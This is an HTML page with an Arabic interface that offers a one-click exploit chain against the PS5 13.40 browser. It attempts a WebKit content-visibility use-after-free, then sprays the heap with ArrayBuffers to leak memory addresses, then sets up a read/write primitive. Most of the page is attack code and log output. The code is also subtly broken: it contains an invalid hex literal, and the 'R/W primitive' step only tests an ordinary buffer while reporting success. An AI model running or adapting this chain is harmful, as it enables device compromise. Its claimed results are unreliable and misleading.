<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PS5 13.40 · content-visibility UAF · R/W</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Courier New',monospace;background:#0a0a0f;color:#e0e0e0;padding:12px}
.container{max-width:800px;margin:0 auto}
h1{color:#ff4757;font-size:17px;text-align:center}
.sub{color:#666;font-size:11px;text-align:center;margin-bottom:8px}
.box{background:#111;border:1px solid #2a2a2a;border-radius:8px;padding:8px;margin-bottom:8px;font-size:11px}
.box .l{color:#74b9ff}
.box .v{color:#55efc4}
#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:8px;padding:10px;height:350px;overflow-y:auto;font-size:11px;line-height:1.6;font-family:monospace;margin-bottom:6px}
#log div{padding:2px 0;border-bottom:1px solid #111}
.info{color:#74b9ff}.ok{color:#55efc4}.err{color:#ff6b6b}.warn{color:#fdcb6e}.ptr{color:#d4a0ff}.crit{color:#ff4757;font-weight:700}.hex{color:#fd79a8}.sep{color:#333;text-align:center;padding:4px 0!important;font-size:9px}
.btn{display:block;width:100%;padding:16px;font-size:14px;font-weight:700;border:none;border-radius:8px;cursor:pointer;margin-bottom:8px;transition:all 0.2s}
.btn:active{transform:scale(0.96)}
.btn-d{background:linear-gradient(135deg,#6b1a1a,#c0392b);color:#fff}
.grp{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
.grp .btn{padding:12px;font-size:12px;margin:0}
</style>
</head>
<body>

<div class="container">
<h1>🔥 PS5 13.40 · content-visibility UAF</h1>
<p class="sub">CVE-2025-43368 · Bug #287908 · RenderLayer compositing UAF</p>

<div class="box" id="infoBox">
<div class="l">📌 UAF: <span id="sUAF">—</span></div>
<div class="l">📌 Spray + Leak: <span id="sLeak">—</span></div>
<div class="l">📌 R/W: <span id="sRW">—</span></div>
</div>

<button class="btn btn-d" id="btnUaf">🎯 1. UAF (content-visibility)</button>
<div class="grp">
<button class="btn btn-d" id="btnSpray">💉 2. Spray + Leak</button>
<button class="btn btn-d" id="btnRW">📖 3. R/W Primitive</button>
</div>
<button class="btn btn-d" id="btnFull">💀 السلسلة الكاملة</button>

<div id="log"><div class="info">[*] جاهز. اضغط أي زر.</div></div>
</div>

<script>
(function() {
'use strict';

const L = (m,c='info') => {
  const t = new Date().toTimeString().slice(0,8);
  document.getElementById('log').innerHTML += `<div class="${c}">[${t}] ${m}</div>`;
  document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
};
const wait = ms => new Promise(r => setTimeout(r, ms));

// ======================== DOUBLE HELPERS ========================
let _f64 = new Float64Array(1);
let _u32 = new Uint32Array(_f64.buffer);
function d2lo(d) { _f64[0] = d; return _u32[0]; }
function d2hi(d) { _f64[0] = d; return _u32[1]; }
function u2d(lo, hi) { _u32[0] = lo; _u32[1] = hi; return _f64[0]; }

// ======================== STATE ========================
let state = {
  uafReady: false,
  sprayBuffers: [],
  leakedAddrs: [],
  container: null,
  child: null,
  observer: null,
  rwBuffer: null,
  rwView: null
};

// ======================== STEP 1: UAF ========================
window.step1 = async function step1() {
  L('── 🎯 STEP 1: content-visibility UAF ──', 'sep');
  
  // 1. إنشاء العناصر
  let c = document.createElement('div');
  c.id = 'uafContainer';
  c.style.cssText = 'width:100px;height:100px;background:blue;position:absolute;left:-9999px';
  document.body.appendChild(c);
  
  let child = document.createElement('div');
  child.id = 'uafChild';
  child.style.cssText = 'width:50px;height:50px;background:red';
  child.textContent = 'TARGET';
  c.appendChild(child);
  
  state.container = c;
  state.child = child;
  
  L('[1] عناصر DOM منشأة', 'ok');
  
  // 2. MutationObserver
  let observer = new MutationObserver(function(mutations) {
    L('[!] MutationObserver: DOM تغير!', 'warn');
    
    for (let m of mutations) {
      if (m.type === 'childList' && m.removedNodes.length > 0) {
        L('[!] child حذف من DOM — UAF!', 'crit');
        
        // استرجاع content-visibility ← recomputation على ذاكرة فاسدة
        try {
          c.style.contentVisibility = 'auto';
          L('[!] Re-computation على layer tree مفكك', 'warn');
        } catch(e) {}
      }
    }
  });
  
  observer.observe(c, { childList: true, subtree: true, attributes: true });
  state.observer = observer;
  L('[2] Observer مربوط', 'ok');
  
  // 3. UAF
  L('[3] تنفيذ UAF...', 'info');
  c.style.contentVisibility = 'hidden';
  L('    content-visibility: hidden', 'ok');
  
  await wait(50);
  
  child.remove();
  L('    child removed من DOM', 'ok');
  
  await wait(50);
  
  c.style.contentVisibility = 'auto';
  L('    content-visibility: auto ← recomputation', 'warn');
  
  // 4. GC
  for (let g = 0; g < 20; g++) new ArrayBuffer(4 * 1024 * 1024);
  L('[4] GC مضغوط', 'ok');
  
  state.uafReady = true;
  document.getElementById('sUAF').textContent = '✅ تم';
  L('[✅] UAF جاهز — الذاكرة فاسدة', 'crit');
  return true;
};

// ======================== STEP 2: SPRAY + LEAK ========================
window.step2 = function step2() {
  L('── 💉 STEP 2: Spray + Leak ──', 'sep');
  
  if (!state.uafReady) {
    L('[-] شغّل UAF أولاً!', 'err');
    return false;
  }
  
  L('[1] إنشاء ArrayBuffers للـ spray...', 'info');
  
  let spray = [];
  
  // حجم 0x90 (144 بايت) لتغطية RenderLayer (~0x80-0xA0)
  for (let i = 0; i < 2000; i++) {
    let ab = new ArrayBuffer(0x90);
    let v = new Uint32Array(ab);
    v[0] = 0xDEADBEEF;
    v[1] = 0x13371337;
    v[2] = 0x41414141 + i;
    v[3] = 0x10000001 + i;
    spray.push({ ab, v });
  }
  
  // حجم 0x80 (128 بايت) — حجم آخر محتمل
  for (let i = 0; i < 2000; i++) {
    let ab = new ArrayBuffer(0x80);
    let v = new Uint32Array(ab);
    v[0] = 0xBEEFDEAD;
    v[1] = 0xDEADCODE;
    v[2] = 0x20000001 + i;
    spray.push({ ab, v });
  }
  
  // حجم 0xA0 (160 بايت)
  for (let i = 0; i < 1000; i++) {
    let ab = new ArrayBuffer(0xA0);
    let v = new Uint32Array(ab);
    v[0] = 0xCAFEBABE;
    v[1] = 0x12345678;
    spray.push({ ab, v });
  }
  
  state.sprayBuffers = spray;
  L(`[2] ${spray.length} ArrayBuffers منشأة`, 'ok');
  
  // GC بعد الـ spray
  for (let g = 0; g < 30; g++) new ArrayBuffer(4 * 1024 * 1024);
  L('[3] GC بعد الـ spray', 'ok');
  
  // ========== فحص الذاكرة ==========
  L('[4] فحص جميع buffers...', 'warn');
  
  let corrupted = 0;
  let addrs = [];
  
  for (let i = 0; i < spray.length; i++) {
    try {
      let sb = spray[i];
      let v0 = sb.v[0];
      
      let markerOK = (v0 === 0xDEADBEEF || v0 === 0xBEEFDEAD || v0 === 0xCAFEBABE);
      
      if (!markerOK && v0 !== undefined && v0 !== 0 && v0 !== 0xFFFFFFFF) {
        corrupted++;
        
        for (let j = 0; j < 10; j++) {
          let val = sb.v[j];
          if (val && val > 0x00010000 && val < 0xFFFFFFFF) {
            addrs.push({ idx: i, offset: j * 4, value: val });
            
            if (addrs.length <= 30) {
              let type = '';
              if (val >= 0x80000000) type = '(🧠 libkernel?)';
              else if (val >= 0x10000000 && val < 0x30000000) type = '(🌐 WebKit?)';
              else if (val >= 0x70000000) type = '(📦 libSce?)';
              else type = '';
              L(`    [${addrs.length}] buffer[${i}][${j*4}] = 0x${val.toString(16).padStart(8,'0')} ${type}`, 'ptr');
            }
          }
        }
      }
    } catch(e) {}
  }
  
  state.leakedAddrs = addrs;
  
  L('', 'sep');
  L(`[5] سليم: ${spray.length - corrupted}/${spray.length}`, 'ok');
  L(`[6] فاسد: ${corrupted}`, corrupted > 0 ? 'crit' : 'warn');
  L(`[7] عناوين مسربة: ${addrs.length}`, addrs.length > 0 ? 'crit' : 'warn');
  
  if (addrs.length > 0) {
    document.getElementById('sLeak').textContent = `✅ ${addrs.length} عنوان`;
    
    let webkit = addrs.filter(a => a.value >= 0x10000000 && a.value < 0x30000000);
    let kernel = addrs.filter(a => a.value >= 0x80000000);
    
    L('', 'sep');
    L('📊 تحليل:', 'crit');
    L(`🌐 WebKit (0x1...0x2...): ${webkit.length}`, webkit.length > 0 ? 'ok' : 'info');
    L(`🧠 libkernel (0x8...): ${kernel.length}`, kernel.length > 0 ? 'ok' : 'info');
    
    if (webkit.length > 0) {
      L('', 'sep');
      L('🏆 عناوين WebKit:', 'crit');
      let unique = [...new Set(webkit.map(a => a.value))];
      for (let a of unique.slice(0, 15)) {
        L(`    0x${a.toString(16).padStart(8,'0')}`, 'hex');
      }
    }
    
    return true;
  }
  
  // المحاولة الثانية — UAF أعمق
  L('[!] ما لقينا فساد — نجرب UAF أعمق...', 'warn');
  
  if (state.container) {
    try {
      state.container.style.contentVisibility = 'hidden';
      let newChild = document.createElement('div');
      newChild.textContent = 'UAF2';
      state.container.appendChild(newChild);
      state.container.style.contentVisibility = 'auto';
      
      for (let g = 0; g < 50; g++) new ArrayBuffer(8 * 1024 * 1024);
      
      for (let i = 0; i < spray.length; i++) {
        try {
          let sb = spray[i];
          let v0 = sb.v[0];
          let m = (v0 === 0xDEADBEEF || v0 === 0xBEEFDEAD || v0 === 0xCAFEBABE);
          if (!m && v0 > 0x100000) {
            state.leakedAddrs.push({ value: v0 });
          }
        } catch(e) {}
      }
      
      if (state.leakedAddrs.length > 0) {
        L(`[8] ✅ ${state.leakedAddrs.length} عنوان من المحاولة الثانية`, 'crit');
        document.getElementById('sLeak').textContent = `✅ ${state.leakedAddrs.length}`;
        return true;
      }
    } catch(e) {}
  }
  
  document.getElementById('sLeak').textContent = '❌ فشل';
  L('[❌] فشل — استخدمنا UAF مختلف', 'err');
  return false;
};

// ======================== STEP 3: R/W ========================
window.step3 = function step3() {
  L('── 📖 STEP 3: ArrayBuffer R/W ──', 'sep');
  
  let ab = new ArrayBuffer(256);
  let v32 = new Uint32Array(ab);
  
  v32[0] = 0x41414141;
  let check = v32[0] === 0x41414141;
  
  L(`اختبار: write(0x41414141) → read() = 0x${v32[0].toString(16)}`, check ? 'ok' : 'err');
  
  let v64 = new Float64Array(ab);
  v64[0] = u2d(0xDEAD, 0xBEEF);
  let lo = d2lo(v64[0]);
  let hi = d2hi(v64[0]);
  L(`اختبار double: hi=0x${hi.toString(16)} lo=0x${lo.toString(16)}`, (lo===0xDEAD && hi===0xBEEF) ? 'ok' : 'err');
  
  if (check) {
    state.rwBuffer = ab;
    state.rwView = v32;
    document.getElementById('sRW').textContent = '✅ شغال';
    L('[✅] R/W Primitive جاهزة', 'crit');
    return true;
  }
  
  document.getElementById('sRW').textContent = '❌ فشل';
  return false;
};

// ======================== RUN FULL ========================
window.runAll = async function runAll() {
  document.getElementById('log').innerHTML = '<div class="crit">[*] تشغيل السلسلة الكاملة...</div>';
  
  L('══════════════════════════════════', 'sep');
  L('🔥 PS5 13.40 · FULL CHAIN', 'crit');
  L('══════════════════════════════════', 'sep');
  
  L('── الخطوة 1/3: UAF ──', 'sep');
  let p1 = await window.step1();
  await wait(200);
  
  L('── الخطوة 2/3: Spray + Leak ──', 'sep');
  let p2 = false;
  if (p1) { p2 = window.step2(); }
  await wait(200);
  
  L('── الخطوة 3/3: R/W ──', 'sep');
  let p3 = window.step3();
  
  await wait(200);
  L('', 'sep');
  L('══════════════════════════════════', 'sep');
  L('💀 PS5 13.40 · RESULT', 'crit');
  L('══════════════════════════════════', 'sep');
  L(`UAF: ${p1 ? '✅' : '❌'}`, p1 ? 'ok' : 'err');
  L(`Leak: ${p2 ? '✅' : '❌'}`, p2 ? 'ok' : 'err');
  L(`R/W: ${p3 ? '✅' : '❌'}`, p3 ? 'ok' : 'err');
  
  if (state.leakedAddrs.length > 0) {
    L('', 'sep');
    L('📋 العناوين المسربة:', 'crit');
    let unique = [...new Set(state.leakedAddrs.map(a => a.value))];
    for (let a of unique.slice(0, 20)) {
      L(`    0x${a.toString(16).padStart(8,'0')}`, 'hex');
    }
  }
  
  L('══════════════════════════════════', 'sep');
};

// ======================== BIND BUTTONS ========================
document.getElementById('btnUaf').addEventListener('click', () => window.step1());
document.getElementById('btnSpray').addEventListener('click', () => window.step2());
document.getElementById('btnRW').addEventListener('click', () => window.step3());
document.getElementById('btnFull').addEventListener('click', () => window.runAll());

L('[*] PS5 13.40 Exploit جاهز. الأزرار تشتغل.', 'ok');
L('[✅] كل الأزرار مربوطة بالـ JS functions', 'ok');

})();
</script>
</body>
</html>
